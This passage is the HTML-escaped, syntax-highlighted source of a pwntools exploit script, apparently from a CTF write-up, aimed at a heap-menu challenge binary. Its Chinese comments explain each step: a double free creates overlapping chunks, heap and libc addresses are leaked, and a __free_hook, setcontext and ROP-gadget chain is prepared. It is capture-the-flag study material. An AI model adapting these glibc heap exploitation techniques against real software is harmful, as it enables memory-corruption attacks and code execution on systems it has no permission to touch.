class=&#34;keyword&#34;&gt;import&lt;/span&gt; argv&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;leak&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;var&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    callers_local_vars = inspect.currentframe().f_back.f_locals.items()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    temp =  [var_name &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; var_name, var_val &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; callers_local_vars &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; var_val &lt;span class=&#34;keyword&#34;&gt;is&lt;/span&gt; var][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.info(temp + &lt;span class=&#34;string&#34;&gt;&amp;#x27;: &amp;#123;:#x&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(var))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s      = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data               :p.send(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sa      = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; delim,data         :p.sendafter(delim, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sl      = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data               :p.sendline(data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sla     = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; delim,data         :p.sendlineafter(delim, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r      = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; numb=&lt;span class=&#34;number&#34;&gt;4096&lt;/span&gt;          :p.recv(numb)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru      = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; delims, drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;  :p.recvuntil(delims, drop)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu32    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data               :u32(data.ljust(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\0&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uu64    = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data               :u64(data.ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\0&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;plt     = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data               :elf.plt[data]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;got     = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data               :elf.got[data]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sym     = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt; data               :libc.sym[data]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;itr     = &lt;span class=&#34;keyword&#34;&gt;lambda&lt;/span&gt;                    :p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;local_libc  = &lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc.so.6&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remote_libc = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;binary = &lt;span class=&#34;string&#34;&gt;&amp;#x27;./pwn&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.binary = binary&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(binary,checksec=&lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(binary)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(argv) &amp;gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]==&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        p = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = elf.libc&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# libc = ELF(remote_libc)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;dbg&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;cmd=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;#os.system(&amp;#x27;tmux set mouse on&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(p,cmd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(p)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;chunk_list = 0x40A0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;chunk_list_flag = 0x04060&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;gender_chance = 0x4010&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# start&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;DEBUG&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,sex,name&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index?\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;2.Girl:\n&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(sex))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sa(&lt;span class=&#34;string&#34;&gt;&amp;quot;Please input your child&amp;#x27;s name:\n&amp;quot;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;name_edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,name&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt; &amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sa(&lt;span class=&#34;string&#34;&gt;&amp;#x27;name:&amp;#x27;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ru(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Done!\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index?&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index?&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;change_sex&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,sex&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;666&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index?&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ru(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Current gender:&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    temp = uu64(r(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;2.Girl:&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(sex))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; temp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;content_edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index?&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sa(&lt;span class=&#34;string&#34;&gt;&amp;#x27;description:&amp;#x27;&lt;/span&gt;,data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;quit&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sla(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt;&amp;gt;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# ----------------------------- 1 利用double free构造堆块重叠， 泄露heap和libc地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(i,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    free(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;-i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 从tcache中取出第一块分配&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 将合并状态下的一部分chunk放入tcache，造成堆块重叠&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 再次申请，使放入tcache中的usbin chunk被分配，泄露堆地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nder: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = uu64(r(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak(heap_addr)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 合并进入usbin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(i,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i)+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ru(&lt;span class=&#34;string&#34;&gt;&amp;#x27;nder: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base = uu64(r(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x1ebbe0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak(base)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# --------------------------- 2 构造堆块重叠，使得可以向chunk+8位置写入数据；令在堆块上布置setcontext链&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;open_addr  = base + sym(&lt;span class=&#34;string&#34;&gt;&amp;#x27;open&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;read_addr = base + sym(&lt;span class=&#34;string&#34;&gt;&amp;#x27;read&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts = base + sym(&lt;span class=&#34;string&#34;&gt;&amp;#x27;puts&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gadget = base + &lt;span class=&#34;number&#34;&gt;0x1547a0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = base + sym(&lt;span class=&#34;string&#34;&gt;&amp;#x27;__free_hook&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setcontext = base + sym(&lt;span class=&#34;string&#34;&gt;&amp;#x27;setcontext&amp;#x27;&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;61&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_rdi_r = base + &lt;span class=&#34;number&#34;&gt;0x26b72&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_rdx_r12_r = base + &lt;span class=&#34;number&#34;&gt;0x11c1e1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p_rsi_r = base + &lt;span class=&#34;number&#34;&gt;0x27529&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak(free_hook)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak(gadget)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;99&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name_edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x380&lt;/span&gt;)[:-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr+&lt;span class=&#34;number&#34;&gt;0x380&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;888&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;999&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl = p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x111&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x3a8&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 在chunk2的gender字段放置地址addr，令addr+0x28指向chunk2的des字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# setcontext&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;gadget 0x154930&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov     rdx, [rdi+8]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    mov     [rsp+0C8h+var_C8], rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    call    qword ptr [rdx+20h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= p64(setcontext)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pl+= (&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;-&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(pl))*&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt; + p64(heap_addr+&lt;span 